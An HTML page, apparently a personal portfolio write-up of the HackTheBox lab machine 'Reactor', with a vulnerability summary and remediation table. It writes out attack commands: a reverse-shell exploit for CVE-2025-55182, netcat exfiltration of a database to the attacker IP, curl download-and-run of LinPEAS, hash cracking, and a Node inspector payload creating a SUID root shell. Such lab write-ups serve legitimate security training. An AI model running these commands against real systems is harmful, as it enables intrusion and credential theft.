@@ -1,0 +1,225 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Reactor — HTB Writeup | Anmol Chaudhary</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=IBM+Plex+Mono:wght@400;500;600&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../styles.css">
+<style>
+  .wu { max-width: 820px; margin: 0 auto; padding: 56px 20px 80px; }
+  .wu-back { font-family: var(--mono); font-size: 0.85rem; color: var(--text-dim); display: inline-flex; align-items: center; gap: 6px; margin-bottom: 24px; transition: color 0.2s ease; }
+  .wu-back:hover { color: var(--accent); text-decoration: none; }
+  .wu-meta { display: flex; align-items: center; gap: 12px; margin: 14px 0 32px; font-family: var(--mono); font-size: 0.85rem; }
+  .wu-date { color: var(--text-dim); margin-left: 6px; }
+  .wu h1 { font-size: 1.8rem; margin: 12px 0 8px; color: var(--text); border-bottom: 1px solid var(--border); padding-bottom: 12px; }
+  .wu h2 { font-size: 1.25rem; margin: 36px 0 14px; color: var(--accent); }
+  .wu h3 { font-size: 1.05rem; margin: 24px 0 10px; color: #f6efe2; }
+  .wu h4 { font-size: 0.95rem; margin: 18px 0 8px; color: var(--text); }
+  .wu p { color: var(--text); max-width: 72ch; margin: 0 0 16px; line-height: 1.65; }
+  .wu pre {
+    background: var(--surface); border: 1px solid var(--border); border-left: 3px solid var(--accent);
+    border-radius: var(--radius); padding: 14px 18px; overflow-x: auto; font-family: var(--mono);
+    font-size: 0.86rem; color: var(--ok); margin: 18px 0 24px; box-shadow: 0 4px 16px rgba(0,0,0,0.3);
+  }
+  .wu code { font-family: var(--mono); background: var(--surface-2); padding: 2px 6px; border-radius: 3px; font-size: 0.88em; border: 1px solid var(--border); }
+  .wu pre code { background: transparent; padding: 0; border: none; font-size: inherit; }
+  .table-wrap { overflow-x: auto; margin: 20px 0; border: 1px solid var(--border); border-radius: var(--radius); }
+  .wu table { width: 100%; border-collapse: collapse; font-family: var(--mono); font-size: 0.85rem; text-align: left; }
+  .wu th, .wu td { padding: 10px 14px; border-bottom: 1px solid var(--border); }
+  .wu th { background: var(--surface-2); color: var(--accent); font-weight: 600; }
+  .wu tr:last-child td { border-bottom: none; }
+  .wu ul, .wu ol { color: var(--text); padding-left: 24px; margin: 12px 0 20px; }
+  .wu li { margin-bottom: 8px; }
+  .wu hr { border: none; border-top: 1px solid var(--border); margin: 36px 0; }
+</style>
+</head>
+<body>
+<header class="nav">
+  <div class="nav-inner">
+    <a href="../index.html" class="nav-prompt">anmol@portfolio<span class="nav-sep">:~$</span><span class="cursor">_</span></a>
+    <a href="../index.html#writeups" class="wu-back" style="margin-bottom:0;">&larr; writeups directory</a>
+  </div>
+</header>
+
+<main class="wu">
+  <a href="../index.html#writeups" class="wu-back">&larr; back to all writeups</a>
+  <h1>Reactor</h1>
+  <div class="wu-meta">
+    <span class="os-tag os-linux">Linux</span>
+    <span class="diff-tag diff-medium">Medium</span>
+    <span class="wu-date">Pwned: 2026-06-01</span>
+  </div>
+
+  <h2>Overview</h2>
+  <div class="table-wrap"><table><thead><tr><th>Field</th><th>Details</th></tr></thead><tbody>
+  <tr><td>Machine Name</td><td>Reactor</td></tr>
+  <tr><td>Operating System</td><td>Linux (Ubuntu 24.04 LTS)</td></tr>
+  <tr><td>Difficulty</td><td>Medium</td></tr>
+  <tr><td>Attack IP</td><td>10.10.14.77</td></tr>
+  <tr><td>Target IP</td><td>10.129.5.40</td></tr>
+  <tr><td>Status</td><td>Pwned</td></tr>
+  </tbody></table></div>
+  <hr>
+  <h2>Executive Summary</h2>
+  <p>This writeup documents my approach to compromising the HackTheBox machine &quot;Reactor.&quot; The engagement involved exploiting a known Remote Code Execution vulnerability in a React Server Components implementation to gain initial access, recovering and cracking credentials from a local database, and escalating privileges by abusing a misconfigured Node.js debug port running as root.</p>
+  <hr>
+  <h2>Methodology</h2>
+  <p>I followed a structured penetration testing approach:</p>
+  <ol>
+  <li>Reconnaissance &amp; Enumeration</li>
+  <li>Vulnerability Identification</li>
+  <li>Exploitation</li>
+  <li>Post-Exploitation &amp; Lateral Movement</li>
+  <li>Privilege Escalation</li>
+  <li>Reporting</li>
+  </ol>
+  <hr>
+  <h2>Reconnaissance</h2>
+  <p>I began with a service and version scan using Nmap to identify exposed attack surface:</p>
+  <p>bash</p>
+  <pre><code>nmap -sV -sC 10.129.5.40</code></pre>
+  <p><strong>Findings:</strong></p>
+  <div class="table-wrap"><table><thead><tr><th>Port</th><th>Service</th><th>Details</th></tr></thead><tbody>
+  <tr><td>22</td><td>SSH</td><td>OpenSSH</td></tr>
+  <tr><td>3000</td><td>HTTP</td><td>Next.js application</td></tr>
+  </tbody></table></div>
+  <p>Navigating to port 3000 revealed a web application identified as &quot;ReactorWatch Monitoring Dashboard.&quot; I inspected the page source and bundled JavaScript to fingerprint the exact framework versions in use:</p>
+  <ul>
+  <li><strong>Next.js</strong>: 15.0.3</li>
+  <li><strong>React</strong>: 19.0.0-rc-66855b96-20241106</li>
+  </ul>
+  <hr>
+  <h2>Vulnerability Identification</h2>
+  <p>Cross-referencing the identified versions against public vulnerability databases, I identified <strong>CVE-2025-55182</strong> — a Remote Code Execution vulnerability affecting React Server Components in the identified version range. This vulnerability allows an unauthenticated attacker to execute arbitrary commands on the server through a malformed server action request.</p>
+  <p><strong>References:</strong></p>
+  <ul>
+  <li>CVE-2025-55182</li>
+  <li>GitHub: github.com/zr0n/react2shell</li>
+  </ul>
+  <hr>
+  <h2>Initial Foothold</h2>
+  <p>I cloned the proof-of-concept exploit and installed its dependencies:</p>
+  <p>bash</p>
+  <pre><code>git clone https://github.com/zr0n/react2shell
+cd react2shell
+npm install</code></pre>
+  <p>Set up a reverse shell listener:</p>
+  <p>bash</p>
+  <pre><code>nc -lvnp 4444</code></pre>
+  <p>Executed the exploit targeting the vulnerable application:</p>
+  <p>bash</p>
+  <pre><code>node react2shell.js http://10.129.5.40:3000 shell 10.10.14.77 4444</code></pre>
+  <p><strong>Result:</strong> Reverse shell obtained as user <code>node</code>.</p>
+  <hr>
+  <h2>Post-Exploitation</h2>
+  <h3>Credential Harvesting</h3>
+  <p>I enumerated the application directory and identified a SQLite database:</p>
+  <pre><code>find /opt -name &quot;*.db&quot; 2&gt;/dev/null
+# /opt/reactor-app/reactor.db</code></pre>
+  <p>I exfiltrated the database to my attack machine using netcat:</p>
+  <p><strong>Receiver (Kali):</strong></p>
+  <pre><code>nc -lvnp 9001 &gt; reactor.db</code></pre>
+  <p><strong>Sender (Target):</strong></p>
+  <pre><code>cat /opt/reactor-app/reactor.db | nc 10.10.14.77 9001</code></pre>
+  <h4>Database Analysis</h4>
+  <pre><code>sqlite3 reactor.db</code></pre>
+  <pre><code>.tables
+SELECT * FROM users;</code></pre>
+  <p><strong>Output:</strong></p>
+  <pre><code>admin|a203b22191d744a4e70ada5c101b17b8|administrator|admin@reactor.htb
+engineer|39d97110eafe2a9a68639812cd271e8e|operator|engineer@reactor.htb</code></pre>
+  <h4>Hash Cracking</h4>
+  <p>The password hashes were identified as MD5 (32-character hexadecimal). I formatted them for offline cracking:</p>
+  <pre><code>echo &#x27;admin:a203b22191d744a4e70ada5c101b17b8&#x27; &gt; hashes.txt
+echo &#x27;engineer:39d97110eafe2a9a68639812cd271e8e&#x27; &gt;&gt; hashes.txt</code></pre>
+  <pre><code>john hashes.txt --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt</code></pre>
+  <p><strong>Result:</strong></p>
+  <pre><code>reactor1    (engineer)</code></pre>
+  <h4>SSH Access</h4>
+  <p>Using the recovered credentials I authenticated via SSH:</p>
+  <p>bash</p>
+  <pre><code>ssh engineer@10.129.5.40
+# Password: reactor1</code></pre>
+  <h4>User Flag</h4>
+  <pre><code>cat ~/user.txt</code></pre>
+  <pre><code>d3c69fa65f8b7760cfd538ecd7c2f5a7</code></pre>
+  <hr>
+  <h2>Privilege Escalation</h2>
+  <h4>Enumeration</h4>
+  <p>I transferred and executed LinPEAS for automated privilege escalation enumeration:</p>
+  <pre><code># Kali — serve the script
+python3 -m http.server 8000
+
+# Target — download and execute
+curl http://10.10.14.77:8000/linpeas.sh -o /tmp/linpeas.sh
+chmod +x /tmp/linpeas.sh
+/tmp/linpeas.sh</code></pre>
+  <h4>Vulnerability Identified — Node.js Debug Port</h4>
+  <p>LinPEAS highlighted a critical misconfiguration in the running process list:</p>
+  <pre><code>root  1419  /usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js</code></pre>
+  <p>A Node.js process owned by <strong>root</strong> was running with the <code>--inspect</code> flag, which enables the V8 Inspector Protocol on port 9229. This protocol allows a connected debugger to evaluate arbitrary JavaScript within the process context. Since the process runs as root, any executed code inherits root privileges.</p>
+  <p>The port was bound to localhost only, requiring port forwarding to reach it externally.</p>
+  <h4>Port Forwarding</h4>
+  <p>I used SSH local port forwarding to tunnel the debug port to my attack machine:</p>
+  <p>bash</p>
+  <pre><code>ssh -L 9229:127.0.0.1:9229 engineer@10.129.5.40</code></pre>
+  <p>This maps <code>127.0.0.1:9229</code> on the target to <code>localhost:9229</code> on my machine through the authenticated SSH tunnel.</p>
+  <h4>Attaching the Debugger</h4>
+  <p>I opened Chrome and navigated to the built-in inspector:</p>
+  <pre><code>chrome://inspect</code></pre>
+  <p>I clicked <strong>Configure</strong>, added <code>localhost:9229</code>, and the remote Node.js process appeared as an inspectable target. I clicked <strong>inspect</strong> to open a dedicated DevTools session connected to the root process.</p>
+  <h4>Code Execution as Root</h4>
+  <p>In the DevTools console I executed the following JavaScript to create a SUID copy of bash:</p>
+  <p>javascript</p>
+  <pre><code>require(&#x27;child_process&#x27;).exec(&#x27;cp /bin/bash /tmp/rootbash &amp;&amp; chmod +s /tmp/rootbash&#x27;)</code></pre>
+  <p>This uses Node&#x27;s native <code>child_process</code> module to copy the bash binary to <code>/tmp</code> and apply the SUID bit, causing it to execute with the permissions of its owner — root.</p>
+  <h4>Privilege Escalation</h4>
+  <p>Back on the target I executed the SUID binary with the <code>-p</code> flag, which instructs bash to preserve the elevated effective user ID rather than dropping to the real user:</p>
+  <p>bash</p>
+  <pre><code>/tmp/rootbash -p
+whoami</code></pre>
+  <pre><code>root</code></pre>
+  <h4>Root Flag</h4>
+  <pre><code>cat /root/root.txt</code></pre>
+  <pre><code>de09ae48ae3ccb6e84b89d176cfadc75</code></pre>
+  <hr>
+  <h3>Vulnerability Summary</h3>
+  <div class="table-wrap"><table><thead><tr><th>#</th><th>Vulnerability</th><th>Severity</th><th>Impact</th></tr></thead><tbody>
+  <tr><td>1</td><td>CVE-2025-55182 — React Server Components RCE</td><td>Critical</td><td>Initial access as node user</td></tr>
+  <tr><td>2</td><td>Plaintext credentials in SQLite database</td><td>Medium</td><td>Credential recovery</td></tr>
+  <tr><td>3</td><td>Weak MD5 password hashing</td><td>Medium</td><td>Password recovery via offline cracking</td></tr>
+  <tr><td>4</td><td>Node.js --inspect port running as root</td><td>High</td><td>Full privilege escalation to root</td></tr>
+  </tbody></table></div>
+  <hr>
+  <h3>Remediation Recommendations</h3>
+  <div class="table-wrap"><table><thead><tr><th>Finding</th><th>Recommendation</th></tr></thead><tbody>
+  <tr><td>Outdated React/Next.js</td><td>Update to latest stable versions</td></tr>
+  <tr><td>MD5 password hashing</td><td>Migrate to bcrypt or Argon2</td></tr>
+  <tr><td>Node.js debug port in production</td><td>Remove --inspect flag from production services</td></tr>
+  <tr><td>Debug port running as root</td><td>Run services as least-privilege user</td></tr>
+  </tbody></table></div>
+  <hr>
+  <h3>Tools Used</h3>
+  <ul>
+  <li>Nmap</li>
+  <li>react2shell (CVE-2025-55182 PoC)</li>
+  <li>SQLite3</li>
+  <li>John the Ripper</li>
+  <li>LinPEAS</li>
+  <li>Chrome DevTools (V8 Inspector)</li>
+  <li>Netcat</li>
+  <li>SSH port forwarding</li>
+  </ul>
+  <hr>
+  <p>_This machine was completed as part of HackTheBox practice for developing offensive security skills in a legal, controlled environment._</p>
+</main>
+
+<footer class="footer">
+  <p>&copy; <span id="year"></span> Anmol Chaudhary — built with HTML, CSS, and curiosity.</p>
+</footer>
+<script>document.getElementById('year').textContent = new Date().getFullYear();</script>
+</body>
+</html>
